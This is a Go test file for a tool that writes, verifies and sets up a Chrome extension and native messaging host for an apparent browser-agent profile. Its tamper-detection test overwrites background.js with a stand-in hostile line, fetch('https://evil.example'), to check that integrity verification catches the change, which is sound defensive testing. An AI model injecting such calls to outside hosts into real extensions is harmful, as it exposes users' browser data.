package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestUnpackedExtensionIDMatchesChrome(t *testing.T) {
	// The id Chromium 154 gave the extension loaded from /opt/ext/obu in the
	// sandbox (its getInfo reported the same).
	if got := unpackedExtensionIDForPath("/opt/ext/obu"); got != "epiahpanfeblamilgojngklkkbcfejpk" {
		t.Fatalf("unexpected id %q", got)
	}
}

func TestEmbeddedExtensionIsWrittenAndTamperIsDetected(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "extension")
	if err := writeEmbeddedExtension(dir); err != nil {
		t.Fatal(err)
	}
	if ok, why := extensionIntact(dir); !ok {
		t.Fatalf("freshly written extension should be intact: %s", why)
	}
	if _, err := os.Stat(filepath.Join(dir, "embed.go")); !os.IsNotExist(err) {
		t.Fatal("the Go embed file must not be written into the extension")
	}
	manifest, _ := os.ReadFile(filepath.Join(dir, "manifest.json"))
	if !strings.Contains(string(manifest), "manifest_version") {
		t.Fatalf("manifest.json not written: %s", manifest)
	}

	background := filepath.Join(dir, "background.js")
	os.WriteFile(background, []byte("fetch('https://evil.example')"), 0o644)
	if ok, why := extensionIntact(dir); ok || !strings.Contains(why, "background.js") {
		t.Fatalf("a changed file must be reported, got %v %q", ok, why)
	}

	if err := writeEmbeddedExtension(dir); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(dir, "extra.js"), []byte("x"), 0o644)
	if ok, why := extensionIntact(dir); ok || !strings.Contains(why, "extra.js") {
		t.Fatalf("an added file must be reported, got %v %q", ok, why)
	}

	if err := writeEmbeddedExtension(dir); err != nil {
		t.Fatal(err)
	}
	os.Remove(filepath.Join(dir, "popup.js"))
	if ok, _ := extensionIntact(dir); ok {
		t.Fatal("a missing file must be reported")
	}
}

func TestShipyardStatusFollowsSetupSteps(t *testing.T) {
	if runtime.GOOS != "darwin" && runtime.GOOS != "linux" {
		t.Skip("chrome plugin setup is for macOS and Linux")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	plugin := filepath.Join(home, "plugins", "chrome")
	os.MkdirAll(plugin, 0o755)
	p, err := resolveShipyardPaths(plugin)
	if err != nil {
		t.Fatal(err)
	}
	if st := checkShipyard(p); st.Ready || st.ExtensionIntact || st.NativeHost {
		t.Fatalf("nothing is set up yet: %+v", st)
	}

	if err := writeEmbeddedExtension(p.ExtensionDir); err != nil {
		t.Fatal(err)
	}
	if err := writeShipyardNativeManifest(p); err != nil {
		t.Fatal(err)
	}
	st := checkShipyard(p)
	if !st.NativeHost || !st.ExtensionIntact || st.ExtensionInstalled || st.Ready || !strings.Contains(st.Problem, shipyardProfile) {
		t.Fatalf("written but not loaded in Chrome yet: %+v", st)
	}
	b, _ := os.ReadFile(p.Manifest)
	var m map[string]any
	json.Unmarshal(b, &m)
	if m["path"] != p.Binary || m["name"] != "com.tinhthanh.open_browser_use.extension" {
		t.Fatalf("native host manifest: %s", b)
	}

	// The user loads it unpacked in the agent profile: Chrome records it in
	// Secure Preferences with the folder's path.
	os.MkdirAll(p.ProfileDir, 0o700)
	prefs, _ := json.Marshal(map[string]any{"extensions": map[string]any{"settings": map[string]any{
		p.ExtensionID: map[string]any{"path": p.ExtensionDir, "manifest": map[string]any{"version": "1.0.0"}},
	}}})
	os.WriteFile(filepath.Join(p.ProfileDir, "Secure Preferences"), prefs, 0o600)
	if st := checkShipyard(p); !st.Ready || st.Problem != "" {
		t.Fatalf("expected ready, got %+v", st)
	}

	// Tampering with the extension turns it back to not ready.
	os.WriteFile(filepath.Join(p.ExtensionDir, "background.js"), []byte("x"), 0o644)
	if st := checkShipyard(p); st.Ready || !strings.Contains(st.Problem, "background.js") {
		t.Fatalf("tampered extension must not be ready: %+v", st)
	}
}

func TestAmbiguousBrowserErrorNamesTheProfiles(t *testing.T) {
	err := ambiguousBrowserError([]connectedProfileInfo{
		{Target: "chrome:Profile 6", DisplayName: "HDBank"},
		{Target: "chrome:Shipyard Agent"},
	})
	if !strings.Contains(err.Error(), "2 browser profiles") || !strings.Contains(err.Error(), "HDBank") || !strings.Contains(err.Error(), "--profile") {
		t.Fatalf("unexpected message: %v", err)
	}
}
